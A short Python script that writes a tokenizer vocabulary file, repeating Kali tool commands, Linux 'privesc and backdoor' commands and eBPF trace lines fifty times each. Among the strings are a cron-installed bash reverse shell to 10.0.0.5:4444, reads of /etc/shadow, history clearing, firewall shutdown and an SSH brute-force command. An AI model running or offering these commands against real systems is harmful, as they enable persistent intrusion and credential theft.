import os

def gen_corpus(out_dir: str):
    os.makedirs(out_dir, exist_ok=True)
    out_file = os.path.join(out_dir, "linux_kali_vocab.txt")

    # core kali stuff we need the model to know natively
    kali = [
        "nmap -sS -p- -T4 -v 192.168.1.0/24",
        "sqlmap -u 'http://target.com/vuln.php?id=1' --dbs --batch",
        "msfconsole -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; exploit'",
        "hydra -l root -P rockyou.txt ssh://10.0.0.5",
        "dirb http://website.com /usr/share/wordlists/dirb/common.txt",
        "john --wordlist=rockyou.txt hashes.txt",
        "hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt",
        "gobuster dir -u http://app.local -w common.txt",
        "burpsuite",
        "wireshark",
        "tcpdump -i eth0 port 80 -w capture.pcap"
    ]

    # classic privesc and backdoors
    linux_cmds = [
        "cat /etc/passwd",
        "cat /etc/shadow",
        "chmod 777 /tmp/malware.sh",
        "chown root:root /tmp/backdoor",
        "crontab -e",
        "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\"' >> /etc/crontab",
        "find / -perm -4000 -type f 2>/dev/null",
        "history -c",
        "ps aux | grep -i 'sshd'",
        "netstat -antp | grep LISTEN",
        "iptables -A INPUT -p tcp --dport 22 -j DROP",
        "systemctl stop firewalld"
    ]

    # raw kernel traces
    ebpf = [
        "sys_enter_execve: pid=4444 comm=bash filename=/bin/sh",
        "sys_enter_connect: pid=1337 comm=nc fd=3 uservaddr=10.0.0.5 port=4444",
        "sys_enter_openat: pid=999 comm=cat filename=/etc/shadow",
        "sys_enter_ptrace: pid=5555 comm=strace request=PTRACE_ATTACH pid=1"
    ]

    print(f"writing vocab to {out_file}")
    
    with open(out_file, "w") as f:
        f.write("# kali tools\n")
        for t in kali:
            # write them a bunch so the tokenizer picks them up as common tokens
            for _ in range(50): f.write(f"{t}\n")
                
        f.write("\n# bash & privesc\n")
        for cmd in linux_cmds:
            for _ in range(50): f.write(f"{cmd}\n")

        f.write("\n# ebpf traces\n")
        for sys in ebpf:
            for _ in range(50): f.write(f"{sys}\n")

    print("done!")

if __name__ == "__main__":
    gen_corpus("data/raw_corpus")
